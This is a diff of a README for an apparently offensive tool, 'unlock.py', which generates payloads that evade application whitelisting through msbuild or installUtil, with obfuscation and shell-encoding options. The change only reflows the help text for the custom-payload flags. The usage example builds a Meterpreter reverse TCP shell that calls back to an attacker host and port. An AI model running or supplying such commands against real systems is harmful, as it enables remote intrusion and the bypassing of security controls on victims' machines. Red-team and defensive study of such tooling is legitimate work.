@@ -20,9 +20,8 @@ unlock.py [-h] [--output FILENAME] [--framework FWV]
 --method METHOD      Evasion method: msbuild or installUtil  
 --enaobf             Enable CS code obfuscation  
 --encshell ENCSHELL  Encode shell with: *date* or hostname  
---custom CUSTOM      Custom binary payload (don't use with  
-                       --payload/--lhost/--lport  
-  --x64                set if your custom payload is x64  
+--custom CUSTOM      Custom binary payload (don't use with --payload/--lhost/--lport  
+--x64                set if your custom payload is x64  
 
 ## Examples
 - python unlock.py --framework 4.0 --payload windows/x64/meterpreter/reverse_tcp --lhost 192.168.0.1 --lport 4444 --method installUtil  
